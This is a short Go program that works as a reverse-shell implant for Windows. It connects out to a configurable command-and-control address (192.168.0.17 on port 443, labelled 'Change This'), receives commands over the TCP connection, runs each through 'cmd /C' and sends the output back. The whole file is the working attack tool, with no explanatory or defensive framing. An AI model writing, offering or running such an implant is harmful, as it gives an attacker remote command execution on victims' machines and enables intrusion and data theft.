package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	c2Host := "192.168.0.17" // Change This
	c2Port := "443"          // Change This
	address := net.JoinHostPort(c2Host, c2Port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("[-] Failed to connect to C2:", err)
		return
	}
	defer conn.Close()
	fmt.Println("[*] Connected to C2")

	for {
		cmdReader := bufio.NewReader(conn)
		cmd, err := cmdReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Failed to read from C2:", err)
			return
		}
		cmd = strings.TrimSpace(cmd)
		out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			out = append(out, []byte("\n[!] Command error: "+err.Error())...)
		}
		conn.Write(out)
	}
}
